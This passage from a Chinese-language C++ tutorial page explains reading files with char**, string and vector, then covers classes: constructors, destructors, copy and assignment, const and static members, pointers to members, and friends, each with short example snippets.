class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> sArray[<span class="number">10</span>] = &#123;</span><br><span class="line"><span class="string">&quot;0&quot;</span>,</span><br><span class="line"><span class="string">&quot;1&quot;</span>,</span><br><span class="line"><span class="string">&quot;22&quot;</span>,</span><br><span class="line"><span class="string">&quot;333&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">  <span class="built_in">cout</span>&lt;&lt;sArray[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="vector类"><a class="markdownIt-Anchor" href="#vector类"></a> vector类</h2><ul><li>使用<code>char**</code>、<code>string</code>、vector三种方式，打印文件中的内容</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">File *fp = fopen(<span class="string">&quot;a.txt&quot;</span>,<span class="string">&quot;r+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fp==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> lineCount=<span class="number">0</span>;<span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span>(fgets(buf,<span class="number">1024</span>,fp)!=<span class="literal">NULL</span>)lineCount++;</span><br><span class="line">rewind(fp);</span><br><span class="line"><span class="comment">//----------------char**-------------------</span></span><br><span class="line"><span class="keyword">char</span>**p=(<span class="keyword">char</span>**)<span class="built_in">malloc</span>((lineCount+<span class="number">1</span>)*<span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line"><span class="keyword">char</span> **pt = p;</span><br><span class="line"><span class="keyword">while</span>(fgets(buf,<span class="number">1024</span>,fp)!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">  <span class="keyword">int</span> len=<span class="built_in">strlen</span>(buf);</span><br><span class="line">  *pt = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(len+<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(*pt,buf);pt++;</span><br><span class="line">&#125;</span><br><span class="line">*pt=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">while</span>(*p)<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,*p++);</span><br><span class="line"><span class="comment">//----------------string-------------------</span></span><br><span class="line"><span class="comment">//string str[lineCount];  不推荐使用可变数组</span></span><br><span class="line"><span class="built_in">string</span> * str = <span class="keyword">new</span> <span class="built_in">string</span>[lineCount+<span class="number">1</span>];</span><br><span class="line"><span class="built_in">string</span> * pstr = str;</span><br><span class="line"><span class="keyword">while</span>(fgets(buf,<span class="number">1024</span>,fp)!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">  * pstr++ = buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;lineCount;i++)count&lt;&lt;str[i];</span><br><span class="line"><span class="comment">//----------------vector-------------------</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; vs;</span><br><span class="line"><span class="keyword">while</span>(fgets(buf,<span class="number">1024</span>,fp)!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">  vs.push_back(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vs.size();i++)count&lt;&lt;vs[i];</span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure><h1 id="c面向对象"><a class="markdownIt-Anchor" href="#c面向对象"></a> <code>C++</code>面向对象</h1><h2 id="封装encapsulation"><a class="markdownIt-Anchor" href="#封装encapsulation"></a> 封装(Encapsulation)</h2><ul><li>概念：当单一变量无法完成描述需求的时候，结构体类型解决了这一问题。可以将多个类型打 包成一体，形成新的类型。但是，新类型并不包含，对数据类的操作。所的有操作都是通过函数的方式，去其进行封装。</li></ul><h3 id="定义封装"><a class="markdownIt-Anchor" href="#定义封装"></a> 定义封装</h3><ul><li>封装，可以达到，对外提供接口，屏蔽数据，对内开放数据。</li><li>struct 中所有行为和属性都是 public 的(默认)。C++中的 class 可以指定行为和属性的访问方式，默认为 pirvate。</li></ul><table><thead><tr><th>访问属性</th><th>属性</th><th>对象内部</th><th>对象外部</th></tr></thead><tbody><tr><td>public</td><td>公有</td><td>可访问</td><td>可访问</td></tr><tr><td>protected</td><td>保护</td><td>可访问</td><td>不可访问</td></tr><tr><td>private</td><td>私有</td><td>可访问</td><td>不可访问</td></tr></tbody></table><h3 id="用class去封装带行为的类"><a class="markdownIt-Anchor" href="#用class去封装带行为的类"></a> 用class去封装带行为的类</h3><ul><li>class 封装的本质，在于将数据和行为，绑定在一起然后通过对象来完成操作。</li></ul><h2 id="类与对象class-object"><a class="markdownIt-Anchor" href="#类与对象class-object"></a> 类与对象(Class &amp;&amp;object)</h2><h3 id="构造器constructor"><a class="markdownIt-Anchor" href="#构造器constructor"></a> 构造器（Constructor）</h3><ul><li>构造器名与类名相同。</li><li>在类对象创建时，自动调用，完成类对象的初始化。尤其是动态堆内存的申请。</li><li>规则:<ol><li>在对象创建时自动调用,完成初始化相关工作。</li><li>无返回值，与类名同，</li><li>可以重载，可默认参数。</li><li>默认无参空体，一经实现，默认不复存在。</li></ol></li></ul><h4 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">类名(形式参数)</span><br><span class="line">构造体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="参数初始化表"><a class="markdownIt-Anchor" href="#参数初始化表"></a> 参数初始化表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    A(<span class="keyword">char</span> * ps)</span><br><span class="line">      :name(ps),len(<span class="built_in">strlen</span>(name.c_str()))&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dis</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>注意点<ol><li>此格式只能用于类的构造函数。</li><li>初始化列表中的初始化顺序，与声明顺序有关，与前后赋值顺序无关。</li><li>必须用此格式来初始化非静态 const 数据成员(c++98)。</li><li>必须用此格式来实始化引用数据。</li></ol></li></ul><h3 id="析造器destructor"><a class="markdownIt-Anchor" href="#析造器destructor"></a> 析造器(Destructor)</h3><ul><li>析构函数的作用，并不是删除对象，而在对象销毁前完成的一些清理工作。<ol><li>栈对象离开其作用域。</li><li>堆对象被手动 delete.</li></ol></li></ul><h4 id="析构器的定义及意义"><a class="markdownIt-Anchor" href="#析构器的定义及意义"></a> 析构器的定义及意义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名&#123;</span> </span><br><span class="line">~类名()</span><br><span class="line">析造体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在类对像销毁时，自动调用，完成对象的销毁。尤其是类中己申请的堆内存的释放.</li><li>规则:<ol><li>对象销毁时，自动调用。完成销毁的善后工作。</li><li>无返值，与类名同，无参。不可以重载与默认参数。</li><li>系统提供默认空析构器，一经实现，不复存在。</li></ol></li></ul><h3 id="拷贝构造copy-contructor"><a class="markdownIt-Anchor" href="#拷贝构造copy-contructor"></a> 拷贝构造(Copy contructor)</h3><ul><li>由己存在的对象，创建新对象。也就是说新对象，不由构造器来构造，而是由拷贝构造器来完成。拷贝构造器的格式是固定的。</li></ul><h4 id="定义-2"><a class="markdownIt-Anchor" href="#定义-2"></a> 定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">类名(<span class="keyword">const</span> 类名 &amp; another)</span><br><span class="line">拷贝构造体</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">A(<span class="keyword">const</span> A &amp; another)</span><br><span class="line">&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>规则：<ol><li>系统提供默认的拷贝构造器。一经实现，不复存在。</li><li>系统提供的时等位拷贝，也就是所谓的浅浅的拷贝。</li><li>要实现深拷贝，必须要自定义。</li></ol></li></ul><h4 id="拷贝构造发生的时机"><a class="markdownIt-Anchor" href="#拷贝构造发生的时机"></a> 拷贝构造发生的时机</h4><ol><li>制作对象的副本。</li><li>以对象作为参数和返回值。</li></ol><h4 id="深拷贝与浅拷贝"><a class="markdownIt-Anchor" href="#深拷贝与浅拷贝"></a> 深拷贝与浅拷贝</h4><ul><li>系统提供默认的拷贝构造器，一经定义不再提供。但系统提供的默认拷贝构造器是等位拷贝，也就是通常意义上的浅拷贝。如果类中包含的数据元素全部在栈上，浅拷贝也可以满足需求的。但如果堆上的数据，则会发生多次析构行为。</li></ul><p><img src="/images/pasted-49.png" alt="深拷贝与浅拷贝" /></p><h3 id="this-指针"><a class="markdownIt-Anchor" href="#this-指针"></a> this 指针</h3><ul><li>系统在创建对象时，默认生成的指向当前对象的指针。这样作的目的，就是为了带来方便。</li></ul><h4 id="作用"><a class="markdownIt-Anchor" href="#作用"></a> 作用</h4><ol><li>避免构造器的入参与成员名相同。</li><li>基于 this 指针的自身引用还被广泛地应用于那些支持多重串联调用的函数中。比如连续赋值。</li></ol><h3 id="赋值运算符重载operator"><a class="markdownIt-Anchor" href="#赋值运算符重载operator"></a> 赋值运算符重载(Operator=)</h3><ul><li>用一个己有对象，给另外一个己有对象赋值。两个对象均己创建结束后，发生的赋值行为。<ol><li>系统提供默认的赋值运算符重载，一经实现，不复存在。</li><li>系统提供的也是等位拷贝，也就浅拷贝，会造成内存泄漏，重析构。</li><li>要实现深深的赋值，必须自定义。</li><li>自定义面临的问题有三个：1、自赋值；2；内存泄漏、3，重析构</li><li>返回引用，且不能用 const 修饰。<code>a = b = c =&gt; (a+b) = c</code></li></ol></li></ul><h4 id="定义-3"><a class="markdownIt-Anchor" href="#定义-3"></a> 定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">类名</span><br><span class="line">&#123;</span><br><span class="line">类名&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> 类名&amp; 源对象)</span><br><span class="line">拷贝体</span><br><span class="line">&#125;</span><br><span class="line">class A &#123;</span><br><span class="line">  A&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> A&amp; another)&#123;</span><br><span class="line">    <span class="comment">//函数体</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="类和对象"><a class="markdownIt-Anchor" href="#类和对象"></a> 类和对象</h3><h4 id="返回栈上引用与对象"><a class="markdownIt-Anchor" href="#返回栈上引用与对象"></a> 返回栈上引用与对象</h4><h5 id="c语言返回栈变量"><a class="markdownIt-Anchor" href="#c语言返回栈变量"></a> c语言返回栈变量</h5><ul><li>为了解决函数调用完就释放空间的问题，在函数返回的过程产生了”中间变量”作为纽带。</li><li>不管是返回指针还是返回值，return将return之后的值存到<code>eax寄存器</code>中，回到父函数再将返回的值赋给变量。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">3</span>;</span><br><span class="line">i = func();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="c返回栈对象"><a class="markdownIt-Anchor" href="#c返回栈对象"></a> <code>c++</code>返回栈对象</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    A()&#123;<span class="built_in">cout</span>&lt;&lt;<span class="keyword">this</span>&lt;&lt;<span class="string">&quot; constructor&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">    A(<span class="keyword">const</span> A &amp;other)&#123;<span class="built_in">cout</span>&lt;&lt;<span class="keyword">this</span>&lt;&lt;<span class="string">&quot; cp contructor from &quot;</span>&lt;&lt;&amp;other&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">    A &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> A &amp;other)&#123;<span class="built_in">cout</span>&lt;&lt;<span class="keyword">this</span>&lt;&lt;<span class="string">&quot; operator = &quot;</span>&lt;&lt;&amp;other&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">    ~A()&#123;<span class="built_in">cout</span>&lt;&lt;<span class="keyword">this</span>&lt;&lt;<span class="string">&quot; destructor&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>C++</code>的操作方式时，函数有返回值时，在main函数开辟一个临时空间，并将临时空间的地址隐式传递到调用的函数，再把函数内的变量拷贝到指定地址。</li></ul><h5 id="c返回栈对象引用"><a class="markdownIt-Anchor" href="#c返回栈对象引用"></a> c++返回栈对象引用</h5><ul><li>返回栈对象的引用，多用于产生串联应用。比如连等式。</li><li>栈对象是不可以返回引用的。除非，函数的调用者返回自身对象。</li><li>这是由于返回后自身对象并未析构，但是如果是函数内创建的对象，在返回给主函数引用地址前，对象已经析构，可能会造成不可预知的错误。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MyString &amp; MyString::<span class="keyword">operator</span>=(<span class="keyword">const</span> MyString &amp; another)&#123;</span><br><span class="line">  <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h4 id="栈和堆上的对象及对象数组"><a class="markdownIt-Anchor" href="#栈和堆上的对象及对象数组"></a> 栈和堆上的对象及对象数组</h4><ul><li>注意无参构造器的建立，因为如果生成对象数组，没有初始化则必调用无参构造器，或者手动调用带参构造器。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Stu(<span class="built_in">string</span> n):_name(n)&#123;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="built_in">string</span> _name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-----------------------------</span></span><br><span class="line">Stu s; <span class="comment">//error 没有无参构造器</span></span><br><span class="line">Stu s[<span class="number">5</span>]= &#123;Stu(<span class="string">&quot;zhangsan&quot;</span>),Stu(<span class="string">&quot;lisi&quot;</span>)&#125;; <span class="comment">//error 不能指定个数，或部分初始化，则会报错。</span></span><br><span class="line">Stu s[]= &#123;Stu(<span class="string">&quot;zhangsan&quot;</span>),Stu(<span class="string">&quot;lisi&quot;</span>)&#125;;</span><br><span class="line">Stu * ps = <span class="keyword">new</span> Stu[<span class="number">4</span>]&#123;Stu(<span class="string">&quot;zhangsan&quot;</span>)&#125;; <span class="comment">//C11中支持此种初始化方法，但必须对指定的类个数初始化,否则会报错。</span></span><br><span class="line">Stu * ps = <span class="keyword">new</span> Stu[<span class="number">1</span>]&#123;Stu(<span class="string">&quot;zhangsan&quot;</span>)&#125;;</span><br></pre></td></tr></table></figure><h4 id="成员函数的存储方式"><a class="markdownIt-Anchor" href="#成员函数的存储方式"></a> 成员函数的存储方式</h4><ul><li>用类去定义对象时，系统会为每一个对象分配存储空间。如果一个类包括了数据和函数，要分别为数据分配存储空间，而函数则会创建公用的函数代码。这样做会大大节约存储空间。</li></ul><p><img src="/images/pasted-50.png" alt="类成员组成" /></p><ul><li>调用的原理：调用函数时，会通过this指针，找到对应对象的空间，操作不同的变量。</li></ul><h3 id="修饰符"><a class="markdownIt-Anchor" href="#修饰符"></a> 修饰符</h3><h4 id="const修饰符"><a class="markdownIt-Anchor" href="#const修饰符"></a> const修饰符</h4><h5 id="const常量类的成员"><a class="markdownIt-Anchor" href="#const常量类的成员"></a> const常量类的成员</h5><ul><li>const 修饰类的成员变量，表示成员常量，不能被修改，同时它只能在初始化参数列表中赋值(c11 中支持类中初始化)。</li><li>可被 const 和非 const 成员函数调用，而不可以修改。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">A():a(<span class="number">199</span>)&#123;&#125;  <span class="comment">// 初始化参数列表赋值const变量a</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> a;  <span class="comment">// c11支持在类中初始化</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="const常量类的成员函数"><a class="markdownIt-Anchor" href="#const常量类的成员函数"></a> const常量类的成员函数</h5><ul><li>承诺在本函数内部不会修改类内的数据成员，不会调用其它非 const 成员函数。</li><li>const 修饰函数放在，声明之后，实现体之前，大概也没有别的地方可以放了。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dis</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>const 构成函数重载<ol><li>如果 const 构成函数重载，const 对象只能调用 const 函数，非 const 对象优先调用非 const 函数，若无则调用const成员函数。</li><li>const 函数只能调用 const 函数。非 const 函数可以调用 const 函数。</li><li>类体外定义的 const 成员函数，在定义和声明处都需要 const 修饰符</li></ol></li></ul><h5 id="const常量类对象"><a class="markdownIt-Anchor" href="#const常量类对象"></a> const常量类对象</h5><ol><li>const 对象，只能调用 const 成员函数。</li><li>可访问 const 或非 const 数据成员，不能修改。</li></ol><h4 id="static修饰符"><a class="markdownIt-Anchor" href="#static修饰符"></a> static修饰符</h4><ul><li>在 C++中，静态成员是属于整个类的而不是某个对象，静态成员变量只存储一份供所有对象共用。所以在所有对象中都可以共享它。</li><li>使用静态成员变量实现多个对象之间的数据共享不会破坏隐藏(相比全局变量的优点)的原则，保证了安全性还可以节省内存。</li><li>类的静态成员，属于类，也属于对象，但终归属于类。</li></ul><h5 id="static的类成员"><a class="markdownIt-Anchor" href="#static的类成员"></a> static的类成员</h5><ul><li>使用静态类成员<ol><li>static 成员变量实现了同簇类对象间信息共享。</li><li>static 成员类外存储，求类大小，并不包含在内。</li><li>static 成员是命名空间属于类的全局变量，存储在 data 区 rw 段。</li><li>static 成员使用时必须实始化，且只能类外初始化。</li><li>可以通过类名访问（无对象生成时亦可），也可以通过对象访问。</li><li>static 成员在类声明的时候就开辟空间并初始化了，而普通类成员在类构造时才开辟空间并初始化；</li></ol></li><li>声明：<code>static 数据类型 成员变量; //在类的内部</code></li><li>初始化：必须在类的外部<code>数据类型 类名::静态数据成员 = 初值; //没有static修饰</code></li><li>调用：<code>类名::静态数据成员</code>; <code>类对象.静态数据成员</code></li></ul><h5 id="static的类成员函数"><a class="markdownIt-Anchor" href="#static的类成员函数"></a> static的类成员函数</h5><ul><li>使用静态类成员函数<ol><li>静态成员函数的意义，不在于信息共享，数据沟通，而在于管理静态数据成员，完成对静态数据成员的封装。</li><li>静态成员函数只能访问静态数据成员。原因：非静态成员函数，在调用时 this指针时被当作参数传进。而静态成员函数属于类，而不属于对象，没有 this 指针。</li></ol></li><li>声明：<code>static 函数声明</code></li><li>调用：<code>类名::函数调用</code>；<code>类对象.函数调用</code></li></ul><h4 id="static-const-类成员"><a class="markdownIt-Anchor" href="#static-const-类成员"></a> static const 类成员</h4><ul><li>如果一个类的成员，既要实现共享，又要实现不可改变，那就用 static const 修饰。修饰成员函数，格式并无二异，修饰数据成员。</li><li>必须要类内部实始化。</li></ul><h4 id="指向类成员的指针"><a class="markdownIt-Anchor" href="#指向类成员的指针"></a> 指向类成员的指针</h4><ul><li>在 C++语言中，可以定义一个指针，使其指向类成员或成员函数，然后通过指针来访问类的成员。这包括指向属性成员的指针和指向成员函数的指针。</li></ul><h5 id="指向类数据成员的指针"><a class="markdownIt-Anchor" href="#指向类数据成员的指针"></a> 指向类数据成员的指针</h5><ul><li>定义：<code>&lt;成员数据类型&gt;&lt;类名&gt;::*&lt;指针名&gt;</code></li><li>赋值&amp;初始化：<code>&lt;成员数据类型&gt;&lt;类名&gt;::*&lt;指针名&gt;[=&amp;&lt;类名&gt;::&lt;非静态数据成员&gt;]</code><ul><li>指向非静态数据成员的指针在定义时必须和类相关联，在使用时必须和具体的对象关联。实际保存的是某个对象成员相对于这个类生成对象其实地址的偏移量，所以可以适用任意对象。</li></ul></li><li>解用引：由于类不是运行时 存在的对象。因此，在使用这类指针时，需要首先指定类的一个对象，然后，通过对象来引用指针所指向的成员。<br /><code>&lt;类对象名&gt;.*&lt;指向非静态数据成员的指针&gt;</code><br /><code>&lt;类对象指针&gt;-&gt;*&lt;指向非静态数据成员的指针&gt;</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Student <span class="title">s</span><span class="params">(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">1002</span>)</span></span>;</span><br><span class="line"><span class="built_in">string</span> Student::*ps = &amp;Student::name;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;s.*ps&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">Student *pp = <span class="keyword">new</span> Student(<span class="string">&quot;wangwu&quot;</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;pp-&gt;*ps&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><h5 id="指向类成员函数的指针"><a class="markdownIt-Anchor" href="#指向类成员函数的指针"></a> 指向类成员函数的指针</h5><ul><li>一个指向非静态成员函数的指针必须在三个方面与其指向的成员函数保持一致：参数列表要相同、返回类型要相同、所属的类型要相同</li><li>定义：<code>&lt;数据类型&gt;(&lt;类名&gt;::*&lt;指针名&gt;)(&lt;参数列表&gt;)</code></li><li>赋值&amp;初始化：<code>&lt;数据类型&gt;(&lt;类名&gt;::*&lt;指针名&gt;)(&lt;参数列表&gt;)[=&amp;&lt;类名&gt;::&lt;非静态成员函数&gt;]</code></li><li>解用引由于类不是运行时存在的对象。因此，在使用这类指针时，需要首先指定类的一个对象，然后，通过对象来引用指针所指向的成员。<code>(&lt;类对象名&gt;.*&lt;指向非静态成员函数的指针&gt;)(&lt;参数列表&gt;)</code>；<code>(&lt;类对象指针&gt;-&gt;*&lt;指向非静态成员函数的指针&gt;)(&lt;参数列表&gt;)</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Student <span class="title">s</span><span class="params">(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">1002</span>)</span></span>;</span><br><span class="line">Student *ps = <span class="keyword">new</span> Student(<span class="string">&quot;lisi&quot;</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">void</span> (Student::*pf)() = &amp; Student::dis;</span><br><span class="line">(s.*pf)();</span><br><span class="line">(ps-&gt;*pf)();</span><br></pre></td></tr></table></figure><h5 id="指向类静态成员的指针"><a class="markdownIt-Anchor" href="#指向类静态成员的指针"></a> 指向类静态成员的指针</h5><ul><li><strong>类静态数据成员的指针</strong>：指向静态数据成员的指针的定义和使用与普通指针相同，在定义时无须和类相关联，在使用时也无须和具体的对象相关联。</li><li><strong>指向类静态成员函数的指针</strong>：向静态成员函数的指针和普通指针相同，在定义时无须和类相关联，在使用时也无须和具体的对象相关联。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dis</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;data&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> *p = &amp; A::data;<span class="built_in">cout</span>&lt;&lt;*p&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">void</span> (*pfunc)() = &amp;A::dis;pfunc();</span><br></pre></td></tr></table></figure><h5 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h5><ul><li>与普通意义上的指针不一样。存放的是偏移量。指向非静态成员函数时，必须用类名作限定符，使用时则必须用类的实例作限定符。指向静态成员函数时，则不需要使用类名作限定符。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//适用类成员函数指针实现内部函数选择调用</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Widget()&#123;fptr[<span class="number">0</span>] = &amp;f;fptr[<span class="number">1</span>] = &amp;g;fptr[<span class="number">2</span>] = &amp;h;fptr[<span class="number">3</span>] = &amp;i;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(idx&lt;<span class="number">0</span> || idx&gt;cnt) <span class="keyword">return</span>;</span><br><span class="line">    (<span class="keyword">this</span>-&gt;*fptr[idx])(val);  <span class="comment">//fptr只是存了偏移量，所以必须与this一起</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> cnt;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> val)</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;void f() &quot;</span>&lt;&lt;val&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">(<span class="keyword">int</span> val)</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;void g() &quot;</span>&lt;&lt;val&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">h</span><span class="params">(<span class="keyword">int</span> val)</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;void h() &quot;</span>&lt;&lt;val&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">i</span><span class="params">(<span class="keyword">int</span> val)</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;void i() &quot;</span>&lt;&lt;val&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">  <span class="keyword">enum</span>&#123; cnt = <span class="number">4</span>&#125;;   <span class="comment">//建议使用匿名enum作为常量</span></span><br><span class="line">  <span class="keyword">void</span> (Widget::*fptr[cnt])(<span class="keyword">int</span>);</span><br><span class="line">&#125;;</span><br><span class="line">Widget w;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;w.count(); i++)&#123;</span><br><span class="line">w.select(i,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="友元friend"><a class="markdownIt-Anchor" href="#友元friend"></a> 友元(Friend)</h2><ul><li><p>采用类的机制后实现了数据的隐藏与封装，类的数据成员一般定义为私有成员，成员函数一般定义为公有的，依此提供类与外界间的通信接口。但是，有时需要定义一些函数，这些函数不是类的一部分，但又需要频繁地访问类的数据成员，这时可以将这些函数定义为该类的友元函数。除了友元函数外，还有友元类，两者统称为友元。友元的作用是提高了程序的运行效率（即减少了类型和安全性检查及调用的时间开销），但它破坏了类的封装性和隐藏性，使得非成员函数可以访问类的私有成员。</p></li><li><p>可以是一个函数，该函数被称为友元函数；友元也可以是一个类，该类被称为友元类。</p></li><li><p>友元目的本质，是让其它不属于本类的成员(全局函数，其它类的成员函数)，成为类的成员而具备了本类成员的属性。</p></li></ul><h3 id="友元使用"><a class="markdownIt-Anchor" href="#友元使用"></a> 友元使用</h3><h4 id="声明位置"><a class="markdownIt-Anchor" href="#声明位置"></a> 声明位置</h4><ul><li>友元声明以关键字friend开始，它只能出现在类定义中。因为友元不是授权类的成员，所以它不受其所在类的声明区域 public private 和 protected 的影响。通常我们选择把所有友元声明组织在一起并放在类头之后.</li></ul><h4 id="友元的利弊"><a class="markdownIt-Anchor" href="#友元的利弊"></a> 